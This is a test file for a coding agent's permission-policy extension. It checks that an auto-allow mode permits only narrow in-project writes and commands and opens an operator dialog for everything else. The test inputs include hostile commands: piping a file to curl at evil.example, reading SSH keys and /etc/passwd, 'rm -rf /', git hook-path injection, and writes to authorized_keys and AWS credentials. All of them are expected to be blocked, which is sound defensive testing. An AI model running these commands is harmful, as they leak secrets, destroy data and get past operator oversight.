// seatAuto mode tests (Phase 1 spec A + v3 amendments).
//
// These tests load the REAL extension module with a fake pi ExtensionAPI and a
// throwaway HOME, so they never read or write the real ~/.pi/agent state. An
// "auto-allow" is observed as tool_call returning undefined without opening the
// operator dialog; anything else must open the dialog (recorded via a fake
// ui.select) and come back as { block: true }.
//
// Run: npx --yes tsx permission-policy/test-fixtures/test-seat-auto.ts

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, symlinkSync, unlinkSync, linkSync, lstatSync, readFileSync, readdirSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

const THIS_DIR = path.dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = path.resolve(THIS_DIR, "..", "..");

let permissionPolicyExtension: (api: never) => void;

// ---------------------------------------------------------------------------
// Bootstrap: redirect HOME before importing index.ts (its POLICY_DIR and
// PROMPT_SHIELD_STATE_PATH constants are computed from os.homedir() at load),
// and stub @earendil-works/pi-ai, which index.ts imports at runtime.
// ---------------------------------------------------------------------------

type Harness = {
	toolCall: (event: { toolName: string; input: Record<string, unknown>; toolCallId: string }, ctx: unknown) => Promise<unknown>;
	toolResult: (event: Record<string, unknown>, ctx: unknown) => Promise<unknown>;
	userBash: (event: { command: string; cwd: string }, ctx: unknown) => Promise<unknown>;
	command: (name: string) => ((args: string, ctx: unknown) => Promise<unknown>) | undefined;
};

function loadExtension(): Harness {
	const eventHandlers = new Map<string, (event: never, ctx: never) => unknown>();
	const commandHandlers = new Map<string, (args: string, ctx: never) => unknown>();
	const api: Record<string, unknown> = {
		on(name: string, handler: (event: never, ctx: never) => unknown) {
			eventHandlers.set(name, handler);
		},
		registerFlag() {},
		registerShortcut() {},
		registerCommand(name: string, def: { handler: (args: string, ctx: never) => unknown }) {
			commandHandlers.set(name, def.handler);
		},
		getFlag() {
			return undefined;
		},
		events: { emit() {} },
	};
	permissionPolicyExtension(api as never);
	const toolCall = eventHandlers.get("tool_call");
	const toolResult = eventHandlers.get("tool_result");
	const userBash = eventHandlers.get("user_bash");
	if (!toolCall) throw new Error("extension did not register a tool_call handler");
	if (!toolResult) throw new Error("extension did not register a tool_result handler");
	if (!userBash) throw new Error("extension did not register a user_bash handler");
	return {
		toolCall: (event, ctx) => toolCall(event, ctx) as Promise<unknown>,
		toolResult: (event, ctx) => toolResult(event, ctx) as Promise<unknown>,
		userBash: (event, ctx) => userBash(event, ctx) as Promise<unknown>,
		command: (name) => commandHandlers.get(name),
	};
}

type TestCtx = {
	cwd: string;
	hasUI: boolean;
	dialogs: string[];
	notifications: { message: string; level: string }[];
	selectResult: string;
	ui: {
		select: (text: string, choices: string[]) => Promise<string>;
		confirm: () => Promise<boolean>;
		notify: (message: string, level?: string) => void;
		setStatus: () => void;
	};
};

function makeCtx(projectDir: string, opts: { selectResult?: string } = {}): TestCtx {
	const ctx: TestCtx = {
		cwd: projectDir,
		hasUI: true,
		dialogs: [],
		notifications: [],
		selectResult: opts.selectResult ?? "Deny once",
		ui: {
			select: async (text: string) => {
				ctx.dialogs.push(text);
				return ctx.selectResult;
			},
			confirm: async () => false,
			notify: (message: string, level = "info") => {
				ctx.notifications.push({ message, level });
			},
			setStatus() {},
		},
	};
	return ctx;
}

function freshProjectDir(): string {
	return mkdtempSync(path.join(os.tmpdir(), "seatauto-project-"));
}

// ---------------------------------------------------------------------------
// Policy fixtures
// ---------------------------------------------------------------------------

function policyPathFor(projectDir: string): string {
	const hash = createHash("sha256").update(realpathSync(projectDir)).digest("hex").slice(0, 16);
	return path.join(fakeHome, ".pi", "agent", "permission-policy", "projects", `${hash}.json`);
}

function readPolicy(projectDir: string): Record<string, unknown> {
	return JSON.parse(readFileSync(policyPathFor(projectDir), "utf8")) as Record<string, unknown>;
}

function writePolicy(projectDir: string, policy: Record<string, unknown>): void {
	mkdirSync(path.join(fakeHome, ".pi", "agent", "permission-policy", "projects"), { recursive: true });
	writeFileSync(policyPathFor(projectDir), `${JSON.stringify(policy, null, "\t")}\n`);
}

function seatBlock(manifestPath?: string, expiresAt?: string): Record<string, unknown> {
	return {
		installedBy: "herdr-driver",
		session: "drv-test",
		name: "seat-test",
		manifestPath: manifestPath ?? "",
		installedAt: new Date().toISOString(),
		expiresAt: expiresAt ?? new Date(Date.now() + 3600_000).toISOString(),
	};
}

function seatAutoPolicy(projectDir: string, extra: Record<string, unknown> = {}): Record<string, unknown> {
	const { seat, seatManifest, mode, ...rest } = extra;
	return {
		schemaVersion: 2,
		projectPath: realpathSync(projectDir),
		updatedAt: new Date().toISOString(),
		mode: (mode as string) ?? "seatAuto",
		permissions: {},
		seat: (seat as Record<string, unknown>) ?? seatBlock(seatManifest as string | undefined),
		...rest,
	};
}

// ---------------------------------------------------------------------------
// Assertion helpers
// ---------------------------------------------------------------------------

let callCounter = 0;
function nextId(): string {
	callCounter += 1;
	return `call-${callCounter}`;
}

async function expectAllowed(harness: Harness, ctx: TestCtx, toolName: string, input: Record<string, unknown>): Promise<void> {
	const before = ctx.dialogs.length;
	const result = await harness.toolCall({ toolName, input, toolCallId: nextId() }, ctx);
	assert.equal(result, undefined, `expected auto-allow for ${toolName} ${JSON.stringify(input.command || input.path)}, got ${JSON.stringify(result)}`);
	assert.equal(ctx.dialogs.length, before, `expected no operator dialog for ${JSON.stringify(input.command || input.path)}`);
}

async function expectDialog(harness: Harness, ctx: TestCtx, toolName: string, input: Record<string, unknown>): Promise<void> {
	const before = ctx.dialogs.length;
	const result = await harness.toolCall({ toolName, input, toolCallId: nextId() }, ctx);
	assert.equal((result as { block?: boolean } | undefined)?.block, true, `expected a block for ${JSON.stringify(input.command || input.path)}`);
	assert.equal(ctx.dialogs.length, before + 1, `expected the operator dialog to open for ${JSON.stringify(input.command || input.path)}`);
}

// ---------------------------------------------------------------------------
// Runner (same idiom as test-classification.ts)
// ---------------------------------------------------------------------------

let fakeHome = "";
let passed = 0;
let failed = 0;

async function check(name: string, fn: () => Promise<void>) {
	try {
		await fn();
		passed++;
		console.log(`ok - ${name}`);
	} catch (error) {
		failed++;
		console.error(`FAIL - ${name}`);
		console.error(error);
	}
}

async function main() {
	// Redirect HOME BEFORE importing index.ts.
	fakeHome = mkdtempSync(path.join(os.tmpdir(), "seatauto-home-"));
	process.env.HOME = fakeHome;

	// Minimal stub for index.ts's runtime import of @earendil-works/pi-ai.
	// A6: removed again in the finally below, but only when this run created
	// it, so a pre-existing install is never clobbered. A3/R2: if a stub (or a
	// real install) is already present, fail instead of overwriting it.
	const stubDir = path.join(REPO_ROOT, "node_modules", "@earendil-works", "pi-ai");
	if (existsSync(stubDir)) {
		console.error(
			`refusing to run: ${stubDir} already exists — remove the @earendil-works/pi-ai stub from node_modules first (A3: the suites never overwrite an existing install)`,
		);
		process.exit(1);
	}
	const createdStub = !existsSync(stubDir);
	try {
		await runSuite(stubDir);
	} finally {
		if (createdStub) rmSync(stubDir, { recursive: true, force: true });
	}

	// Reported after the finally above so a failing run still cleans the stub.
	console.log(`\n${passed} passed, ${failed} failed out of ${passed + failed} scenarios`);
	if (failed > 0) process.exit(1);
}

async function runSuite(stubDir: string): Promise<void> {
	mkdirSync(stubDir, { recursive: true });
	writeFileSync(
		path.join(stubDir, "package.json"),
		JSON.stringify({ name: "@earendil-works/pi-ai", version: "0.0.0-test-stub", type: "module", main: "index.js" }, null, "\t"),
	);
	writeFileSync(
		path.join(stubDir, "index.js"),
		"export function complete() { throw new Error('stubbed: complete() is not used by these tests'); }\n",
	);

	const imported = await import("../index.ts");
	permissionPolicyExtension = imported.default as (api: never) => void;

	const harness = loadExtension();

	// A seat project shaped like a herdr worktree: a .git FILE pointing at a
	// main-repo worktree gitdir, like `git worktree add` produces.
	const wtProject = freshProjectDir();
	const mainRepo = freshProjectDir();
	const wtGitDir = path.join(mainRepo, ".git", "worktrees", "wt");
	mkdirSync(wtGitDir, { recursive: true });
	writeFileSync(path.join(mainRepo, ".git", "HEAD"), "ref: refs/heads/main\n");
	writeFileSync(path.join(mainRepo, ".git", "config"), "[core]\n");
	writeFileSync(path.join(wtProject, ".git"), `gitdir: ${wtGitDir}\n`);
	const wtManifest = path.join(realpathSync(fakeHome), ".cache", "herdr-driver", "drv-test", "wt-seat.manifest.json");
	mkdirSync(path.dirname(wtManifest), { recursive: true });
	writePolicy(wtProject, seatAutoPolicy(wtProject, { seatManifest: wtManifest }));

	// A plain-repo project: .git is a directory (no worktree indirection).
	const plainProject = freshProjectDir();
	mkdirSync(path.join(plainProject, ".git"), { recursive: true });
	writeFileSync(path.join(plainProject, ".git", "HEAD"), "ref: refs/heads/main\n");
	writePolicy(plainProject, seatAutoPolicy(plainProject));

	// -----------------------------------------------------------------------
	// A.2 — deterministic write/edit allows
	// -----------------------------------------------------------------------

	await check("seatAuto allows an in-project write to a new file", async () => {
		await expectAllowed(harness, makeCtx(wtProject), "write", { path: "notes/new.txt", content: "hi" });
	});

	await check("seatAuto allows overwriting an existing in-project file (nlink 1)", async () => {
		const target = path.join(wtProject, "exists.txt");
		writeFileSync(target, "old");
		await expectAllowed(harness, makeCtx(wtProject), "write", { path: target, content: "new" });
	});

	await check("seatAuto allows the edit tool on an in-project file", async () => {
		const target = path.join(wtProject, "edit-me.txt");
		writeFileSync(target, "x");
		await expectAllowed(harness, makeCtx(wtProject), "edit", { path: target, old_string: "x", new_string: "y" });
	});

	await check("seatAuto denies writing through a symlinked directory component", async () => {
		mkdirSync(path.join(wtProject, "real-dir"), { recursive: true });
		symlinkSync(path.join(wtProject, "real-dir"), path.join(wtProject, "link-dir"), "dir");
		await expectDialog(harness, makeCtx(wtProject), "write", { path: path.join(wtProject, "link-dir", "x.txt"), content: "hi" });
	});

	await check("seatAuto denies writing to a hardlinked target (nlink > 1)", async () => {
		const a = path.join(wtProject, "hard-a.txt");
		const b = path.join(wtProject, "hard-b.txt");
		writeFileSync(a, "data");
		linkSync(a, b);
		await expectDialog(harness, makeCtx(wtProject), "write", { path: b, content: "swap" });
	});

	await check("seatAuto denies writing the worktree .git entry (file) and its gitdir/common dir", async () => {
		await expectDialog(harness, makeCtx(wtProject), "write", { path: path.join(wtProject, ".git"), content: "gitdir: /evil" });
		await expectDialog(harness, makeCtx(wtProject), "write", { path: path.join(wtGitDir, "HEAD"), content: "ref: refs/heads/evil" });
		await expectDialog(harness, makeCtx(wtProject), "write", { path: path.join(mainRepo, ".git", "config"), content: "[core]" });
	});

	await check("seatAuto denies writing the plain repo .git directory contents", async () => {
		await expectDialog(harness, makeCtx(plainProject), "write", { path: path.join(plainProject, ".git", "hooks", "pre-commit"), content: "#!/bin/sh" });
	});

	await check("seatAuto denies writes into protected roots", async () => {
		for (const target of [
			path.join(fakeHome, ".ssh", "authorized_keys"),
			path.join(fakeHome, ".config", "evil.json"),
			path.join(fakeHome, ".aws", "credentials"),
			path.join(fakeHome, ".gnupg", "x"),
			path.join(fakeHome, ".pi", "agent", "permission-policy", "projects", "hacked.json"),
		]) {
			await expectDialog(harness, makeCtx(wtProject), "write", { path: target, content: "x" });
		}
	});

	await check("manifestPath write is allowed but sibling cache paths are denied (N3)", async () => {
		await expectAllowed(harness, makeCtx(wtProject), "write", { path: wtManifest, content: "{}" });
		await expectDialog(harness, makeCtx(wtProject), "write", { path: path.join(path.dirname(wtManifest), "other.json"), content: "{}" });
		await expectDialog(harness, makeCtx(wtProject), "write", { path: path.join(realpathSync(fakeHome), ".cache", "herdr-driver", "drv-other", "x.json"), content: "{}" });
	});

	await check("N3 manifest exception applies only while seatAuto is active and stays lstat-checked (A4/R2)", async () => {
		const manifestDir = path.join(realpathSync(fakeHome), ".cache", "herdr-driver", "drv-a4");
		mkdirSync(manifestDir, { recursive: true });
		const manifest = path.join(manifestDir, "seat.manifest.json");
		writeFileSync(manifest, "{}");

		// ask mode + seat block + stored writeFiles grant: the exception does
		// not apply, so the protected-path check decides → dialog.
		const askProject = freshProjectDir();
		writePolicy(askProject, seatAutoPolicy(askProject, { mode: "ask", seatManifest: manifest, permissions: { writeFiles: "allow" } }));
		await expectDialog(harness, makeCtx(askProject), "write", { path: manifest, content: "{}" });

		// Expired seat + seatAuto + stored grant: isSeatAutoActive false → dialog.
		const expiredProject = freshProjectDir();
		writePolicy(
			expiredProject,
			seatAutoPolicy(expiredProject, {
				seat: seatBlock(manifest, new Date(Date.now() - 1000).toISOString()),
				permissions: { writeFiles: "allow" },
			}),
		);
		await expectDialog(harness, makeCtx(expiredProject), "write", { path: manifest, content: "{}" });

		// Active seatAuto + grant: the exception applies → still allowed.
		const seatProject = freshProjectDir();
		writePolicy(seatProject, seatAutoPolicy(seatProject, { seatManifest: manifest, permissions: { writeFiles: "allow" } }));
		await expectAllowed(harness, makeCtx(seatProject), "write", { path: manifest, content: "{}" });

		// Active seatAuto but the manifest is hardlinked (nlink 2): the lstat
		// check in the pre-grant gate fails the exception closed → dialog.
		linkSync(manifest, path.join(manifestDir, "manifest-hard.txt"));
		await expectDialog(harness, makeCtx(seatProject), "write", { path: manifest, content: "{}" });
	});

	await check("expired seat block escalates every seatAuto allow to the operator (N7)", async () => {
		const project = freshProjectDir();
		writePolicy(project, seatAutoPolicy(project, { seat: seatBlock(undefined, new Date(Date.now() - 1000).toISOString()) }));
		const ctx = makeCtx(project);
		await expectDialog(harness, ctx, "write", { path: path.join(project, "x.txt"), content: "hi" });
		await expectDialog(harness, ctx, "bash", { command: "npm test" });
	});

	await check("seatAuto with a missing seat block behaves as ask (contract)", async () => {
		const project = freshProjectDir();
		const policy = seatAutoPolicy(project);
		delete policy.seat;
		writePolicy(project, policy);
		await expectDialog(harness, makeCtx(project), "bash", { command: "npm test" });
	});

	// -----------------------------------------------------------------------
	// A.2 — post-write re-stat / revert wiring
	// -----------------------------------------------------------------------

	await check("post-write hardlink swap is reverted from the pre-write copy and recorded", async () => {
		const project = freshProjectDir();
		writePolicy(project, seatAutoPolicy(project));
		const target = path.join(project, "notes.txt");
		writeFileSync(target, "old-bytes");

		const ctx = makeCtx(project);
		const callId = nextId();
		const result = await harness.toolCall({ toolName: "write", input: { path: target, content: "new-bytes" }, toolCallId: callId }, ctx);
		assert.equal(result, undefined, "write should have been allowed");

		// Simulate the swap race: the seat replaces the target with a hardlink
		// to another file between the allow and the write landing.
		const evil = path.join(project, "evil.txt");
		writeFileSync(evil, "evil-bytes");
		unlinkSync(target);
		linkSync(evil, target);

		await harness.toolResult({ toolCallId: callId, toolName: "write", input: { path: target }, isError: false, content: [] }, ctx);

		assert.equal(readFileSync(target, "utf8"), "old-bytes", "target should have been reverted from the pre-write copy");
		const st = lstatSync(target);
		assert.equal(st.nlink, 1, "reverted target should have nlink 1");
		const violationDir = path.join(fakeHome, ".pi", "agent", "permission-policy");
		const violationFiles = readdirSync(violationDir).filter((f) => f.startsWith("seat-violations"));
		assert.equal(violationFiles.length, 1, "a violation should have been recorded");
		const violation = readFileSync(path.join(violationDir, violationFiles[0]), "utf8");
		assert.match(violation, /notes\.txt/);
	});

	await check("post-write check passes through when stat still matches", async () => {
		const project = freshProjectDir();
		writePolicy(project, seatAutoPolicy(project));
		const target = path.join(project, "clean.txt");
		writeFileSync(target, "old-bytes");
		const ctx = makeCtx(project);
		const callId = nextId();
		await harness.toolCall({ toolName: "write", input: { path: target, content: "new-bytes" }, toolCallId: callId }, ctx);
		await harness.toolResult({ toolCallId: callId, toolName: "write", input: { path: target }, isError: false, content: [] }, ctx);
		assert.equal(readFileSync(target, "utf8"), "old-bytes", "harness never executes the write; content must be untouched");
		const violationDir = path.join(fakeHome, ".pi", "agent", "permission-policy");
		const violationFiles = readdirSync(violationDir).filter((f) => f.startsWith("seat-violations"));
		// Only the violation from the previous test exists.
		const content = readFileSync(path.join(violationDir, violationFiles[0]), "utf8");
		assert.ok(!content.includes("clean.txt"), "no new violation should be recorded");
	});

	// -----------------------------------------------------------------------
	// A.3 — deterministic bash shape allows
	// -----------------------------------------------------------------------

	await check("test runner shapes are allowed", async () => {
		const ctx = makeCtx(wtProject);
		for (const command of [
			"npm test",
			"node --test",
			"node --test test/foo.test.ts",
			"python3 -m pytest -q",
			"python3 -m unittest discover",
			"sh tests/run.sh",
			"./node_modules/.bin/tsc --noEmit",
			"claude plugin validate .",
			"claude plugin test foo",
		]) {
			await expectAllowed(harness, ctx, "bash", { command });
		}
	});

	await check("npx tsc is never auto-allowed; only ./node_modules/.bin/tsc --noEmit (N5)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "npx tsc --noEmit" });
		await expectDialog(harness, ctx, "bash", { command: "./node_modules/.bin/tsc --noEmit --build" });
		await expectDialog(harness, ctx, "bash", { command: "npm run test" });
		await expectDialog(harness, ctx, "bash", { command: "python3 -m http.server 8080" });
	});

	await check("sh runner: every argument must be tests/<name>.sh (A7)", async () => {
		const ctx = makeCtx(wtProject);
		await expectAllowed(harness, ctx, "bash", { command: "sh tests/a.sh tests/b.sh" });
		await expectDialog(harness, ctx, "bash", { command: "sh tests/a.sh evil.sh" });
		await expectDialog(harness, ctx, "bash", { command: "sh tests/a.sh -x" });
		await expectDialog(harness, ctx, "bash", { command: "sh src/a.sh" });
	});

	await check("in-project git shapes are allowed", async () => {
		const ctx = makeCtx(wtProject);
		for (const command of [
			"git status",
			"git diff",
			"git log --oneline -5",
			"git show HEAD",
			"git rev-parse HEAD",
			"git branch --show-current",
			"git add src/main.ts",
			'git commit -m "feat: thing"',
			"git --no-pager diff",
		]) {
			await expectAllowed(harness, ctx, "bash", { command });
		}
	});

	await check("git shapes outside the allowlist fall through to the operator", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "git commit --amend" });
		await expectDialog(harness, ctx, "bash", { command: "git add -A" });
		await expectDialog(harness, ctx, "bash", { command: "git branch -D side" });
		await expectDialog(harness, ctx, "bash", { command: "git checkout -b x" });
	});

	await check("git read subcommands cannot write via --output/-o (A3/B2)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "git show --output=/tmp/evil.patch" });
		await expectDialog(harness, ctx, "bash", { command: "git log --output=/tmp/evil.patch" });
		await expectDialog(harness, ctx, "bash", { command: "git diff --output=escape.patch" });
		await expectDialog(harness, ctx, "bash", { command: "git show -o/tmp/evil.patch" });
		await expectDialog(harness, ctx, "bash", { command: "git log -o /tmp/evil.patch" });
		await expectAllowed(harness, ctx, "bash", { command: "git log --oneline -5" });
	});

	await check("test-runner option values cannot smuggle outside paths (A3/B8)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "node --test --import=/tmp/evil-hook.js" });
		await expectDialog(harness, ctx, "bash", { command: "npm test --prefix=../.." });
		await expectAllowed(harness, ctx, "bash", { command: "node --test --import=./setup.js" });
	});

	await check("test-runner argument files are rejected (B5b)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "./node_modules/.bin/tsc --noEmit @args" });
		await expectDialog(harness, ctx, "bash", { command: "node --test @args" });
		await expectDialog(harness, ctx, "bash", { command: "npm test @pkg" });
		await expectDialog(harness, ctx, "bash", { command: "sh tests/run.sh @extra" });
		await expectAllowed(harness, ctx, "bash", { command: "./node_modules/.bin/tsc --noEmit" });
	});

	await check("git -c / --git-dir / -C outside are hard-denied (N2)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "git -c core.hooksPath=/tmp/hooks commit -m x" });
		await expectDialog(harness, ctx, "bash", { command: "git --git-dir=/tmp/evil status" });
		await expectDialog(harness, ctx, "bash", { command: "git --work-tree=/tmp/evil status" });
		await expectDialog(harness, ctx, "bash", { command: "git -C /tmp status" });
		mkdirSync(path.join(wtProject, "sub"), { recursive: true });
		await expectAllowed(harness, ctx, "bash", { command: "git -C sub status" });
	});

	await check("backslash escapes never reach a path check (R3)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "cat ..\\/.ssh\\/id_rsa" });
		await expectDialog(harness, ctx, "bash", { command: "cat \\/etc/passwd" });
		await expectDialog(harness, ctx, "bash", { command: "echo x >> \\/tmp/seatauto-r3-evil" });
		await expectDialog(harness, ctx, "bash", { command: "git -C ..\\/.. status" });
		await expectDialog(harness, ctx, "bash", { command: "cat \"a\\b\"" });
		// a backslash inside single quotes is literal to bash too
		await expectAllowed(harness, ctx, "bash", { command: "grep 'x\\.y' README.md" });
	});

	await check("glob, brace, tilde and other unmodelled characters ask (R4)", async () => {
		const ctx = makeCtx(wtProject);
		for (const command of [
			"cat .*/../*",
			"cat {..,src}/x",
			"cat [.][.]/x",
			"cat ??/x",
			"echo x > .*/../pwn",
			"echo x >> .*/../pwn",
			"git diff --no-index .*/x .gitignore",
			"git -C .*/.. status",
			"cat < ../x",
			"cat ~root/x",
			"ls src/*",
			"sh tests/*.sh",
		]) {
			await expectDialog(harness, ctx, "bash", { command });
		}
		await expectAllowed(harness, ctx, "bash", { command: "cat README.md" });
		await expectAllowed(harness, ctx, "bash", { command: "find . -name '*.ts'" });
	});

	await check("file -f, dotted sh tests/ paths and node --test -e ask (R3)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "file -f list.txt" });
		await expectDialog(harness, ctx, "bash", { command: "file --files-from=list.txt" });
		await expectDialog(harness, ctx, "bash", { command: "sh tests/../evil.sh" });
		await expectDialog(harness, ctx, "bash", { command: "sh tests/./x.sh" });
		await expectDialog(harness, ctx, "bash", { command: "node --test -e 1" });
		await expectDialog(harness, ctx, "bash", { command: "node --test --eval=1" });
		await expectAllowed(harness, ctx, "bash", { command: "file README.md" });
		await expectAllowed(harness, ctx, "bash", { command: "sh tests/a.sh" });
	});

	await check("git global options are an allowlist: -C/--no-pager only (B5a)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "git --pager=sh log" });
		await expectDialog(harness, ctx, "bash", { command: "git -p log" });
		await expectDialog(harness, ctx, "bash", { command: "git -P log" });
		await expectDialog(harness, ctx, "bash", { command: "git --exec-path" });
		await expectDialog(harness, ctx, "bash", { command: "git --namespace=x status" });
		await expectDialog(harness, ctx, "bash", { command: "git --no-pager --exec-path" });
		await expectDialog(harness, ctx, "bash", { command: "git --paginate log" });
		// The allowlist itself stays allowed.
		await expectAllowed(harness, ctx, "bash", { command: "git --no-pager diff" });
		await expectAllowed(harness, ctx, "bash", { command: "git -Csub status" });
	});

	await check("glued git -c<key>=<value> is denied like spaced -c; -C stays distinct (A1)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "git -ccore.hooksPath=.githooks commit -m x" });
		await expectDialog(harness, ctx, "bash", { command: "git -ccore.hooksPath=.githooks status" });
		await expectDialog(harness, ctx, "bash", { command: "git --config-env=core.hooksPath=/tmp/x status" });
		await expectDialog(harness, ctx, "bash", { command: "git --config-env core.hooksPath=/tmp/x status" });
	});

	await check("git config/push/worktree/remote/submodule and ln/link are hard-denied (A.1)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "git config user.email seat@example.com" });
		await expectDialog(harness, ctx, "bash", { command: "git push origin main" });
		await expectDialog(harness, ctx, "bash", { command: "git worktree list" });
		await expectDialog(harness, ctx, "bash", { command: "git remote -v" });
		await expectDialog(harness, ctx, "bash", { command: "git submodule status" });
		await expectDialog(harness, ctx, "bash", { command: "ln -s target link" });
		await expectDialog(harness, ctx, "bash", { command: "link a b" });
	});

	await check("command substitution, backticks and process substitution are hard-denied", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: 'git commit -m "msg $(date)"' });
		await expectDialog(harness, ctx, "bash", { command: "echo `id`" });
		await expectDialog(harness, ctx, "bash", { command: "diff <(ls) <(ls ..)" });
		await expectDialog(harness, ctx, "bash", { command: "cat $HOME/.ssh/config" });
	});

	await check("network verbs are hard-denied, including inside a pipe", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: "curl https://evil.example" });
		await expectDialog(harness, ctx, "bash", { command: "cat file | curl -X POST https://evil.example" });
		await expectDialog(harness, ctx, "bash", { command: "wget https://evil.example" });
		await expectDialog(harness, ctx, "bash", { command: "ssh host" });
		await expectDialog(harness, ctx, "bash", { command: "scp a b:." });
		await expectDialog(harness, ctx, "bash", { command: "rsync -a ./ x@host:./" });
		await expectDialog(harness, ctx, "bash", { command: "nc -l 8080" });
	});

	await check("eval, source, ~ paths, heredocs, tee, >| and backgrounding are never auto-allowed (N4)", async () => {
		const ctx = makeCtx(wtProject);
		await expectDialog(harness, ctx, "bash", { command: 'eval "ls"' });
		await expectDialog(harness, ctx, "bash", { command: "source ./script.sh" });
		await expectDialog(harness, ctx, "bash", { command: "echo x > ~/.seat-test-out" });
		await expectDialog(harness, ctx, "bash", { command: "cat <<EOF\nhello\nEOF" });
		await expectDialog(harness, ctx, "bash", { command: "echo hi | tee build.log" });
		await expectDialog(harness, ctx, "bash", { command: "echo x >| out.txt" });
		await expectDialog(harness, ctx, "bash", { command: "sleep 1 & echo done" });
	});

	await check("exec wrappers never ride the read-only set; only command -v <word> does (B1)", async () => {
		const ctx = makeCtx(wtProject);
		await expectAllowed(harness, ctx, "bash", { command: "command -v node" });
		await expectDialog(harness, ctx, "bash", { command: "command node -e 'console.log(1)'" });
		await expectDialog(harness, ctx, "bash", { command: "command bash -c 'id > pwned.txt'" });
		await expectDialog(harness, ctx, "bash", { command: "command -v node -e x" });
		await expectDialog(harness, ctx, "bash", { command: "exec rm -rf build" });
		await expectDialog(harness, ctx, "bash", { command: "builtin rm -rf build" });
		await expectDialog(harness, ctx, "bash", { command: "env rm -rf build" });
		await expectDialog(harness, ctx, "bash", { command: "nice rm -rf build" });
		await expectDialog(harness, ctx, "bash", { command: "nohup rm -rf build" });
		await expectDialog(harness, ctx, "bash", { command: "time rm -rf build" });
		await expectDialog(harness, ctx, "bash", { command: "timeout 5 rm -rf build" });
		await expectDialog(harness, ctx, "bash", { command: "ls | xargs rm -rf build" });
		await expectDialog(harness, ctx, "bash", { command: "eval 'rm -rf build'" });
		await expectDialog(harness, ctx, "bash", { command: "source ./evil.sh" });
		await expectDialog(harness, ctx, "bash", { command: ". ./evil.sh" });
	});

	await check("newline-joined commands: every line must pass the allowlist (N4)", async () => {
		const ctx = makeCtx(wtProject);
		await expectAllowed(harness, ctx, "bash", { command: "ls\ngit status" });
		await expectAllowed(harness, ctx, "bash", { command: "echo a\necho b" });
		await expectDialog(harness, ctx, "bash", { command: "ls\nrm -rf build" });
		await expectDialog(harness, ctx, "bash", { command: "ls\ntouch x" });
	});

	await check("injected-comment adversarial rows land on their safe outcomes (A5)", async () => {
		const ctx = makeCtx(wtProject);
		// The rm text after # matches the hard-deny shape, so the command asks.
		await expectDialog(harness, ctx, "bash", { command: "ls # rm -rf build" });
		// A2/R2: `#` comments to end of line, so bash would only run `echo ok`;
		// the dialog is the fail-closed outcome (the classifier still sees the
		// commented rm text).
		await expectDialog(harness, ctx, "bash", { command: "echo ok #; rm -rf /" });
		// A # inside a quoted -m message is inert: the commit shape allows it.
		await expectAllowed(harness, ctx, "bash", { command: 'git commit -m "x # y"' });
	});

	await check("strict read-only shapes: find/sed restricted, awk/xargs never (N1)", async () => {
		const ctx = makeCtx(wtProject);
		await expectAllowed(harness, ctx, "bash", { command: "sed -n '10,20p' src/a.ts" });
		await expectAllowed(harness, ctx, "bash", { command: "sed -n '/error/p' build.log" });
		await expectDialog(harness, ctx, "bash", { command: "sed 's/a/b/' src/a.ts" });
		await expectDialog(harness, ctx, "bash", { command: "sed -i 's/a/b/' src/a.ts" });
		await expectDialog(harness, ctx, "bash", { command: "sed -n 's/a/b/w out.txt' src/a.ts" });
		await expectAllowed(harness, ctx, "bash", { command: "find . -name '*.ts'" });
		await expectDialog(harness, ctx, "bash", { command: "find . -name '*.ts' -delete" });
		await expectDialog(harness, ctx, "bash", { command: "find . -exec rm {} +" });
		await expectDialog(harness, ctx, "bash", { command: "find . -fprint out.txt" });
		await expectDialog(harness, ctx, "bash", { command: "awk '{print $1}' f.txt" });
		await expectDialog(harness, ctx, "bash", { command: "ls | xargs cat" });
	});

	await check("read-only heads cannot write or execute via options (B1/R2)", async () => {
		const ctx = makeCtx(wtProject);
		// sort: -o*, --output* (even --output==x) and clusters containing o write.
		await expectDialog(harness, ctx, "bash", { command: "sort -o out.txt in.txt" });
		await expectDialog(harness, ctx, "bash", { command: "sort --output=x in.txt" });
		await expectDialog(harness, ctx, "bash", { command: "sort --output==x in.txt" });
		await expectDialog(harness, ctx, "bash", { command: "sort -no in.txt" });
		// Audit finds: uniq's second positional, --files0-from lists, file -C,
		// rg --pre (executes), sort --compress-program (executes).
		await expectDialog(harness, ctx, "bash", { command: "uniq in.txt out.txt" });
		await expectDialog(harness, ctx, "bash", { command: "wc --files0-from=list.txt" });
		await expectDialog(harness, ctx, "bash", { command: "du --files0-from=list.txt" });
		await expectDialog(harness, ctx, "bash", { command: "file -C" });
		await expectDialog(harness, ctx, "bash", { command: "rg --pre=./evil.sh pat f.txt" });
		await expectDialog(harness, ctx, "bash", { command: "sort --compress-program=gzip in.txt" });
		// Benign forms of the same heads stay allowed.
		await expectAllowed(harness, ctx, "bash", { command: "sort in.txt" });
		await expectAllowed(harness, ctx, "bash", { command: "sort -rn -k2 in.txt" });
		await expectAllowed(harness, ctx, "bash", { command: "uniq in.txt" });
		await expectAllowed(harness, ctx, "bash", { command: "uniq -c in.txt" });
		await expectAllowed(harness, ctx, "bash", { command: "wc -l f.txt" });
		await expectAllowed(harness, ctx, "bash", { command: "file x.txt" });
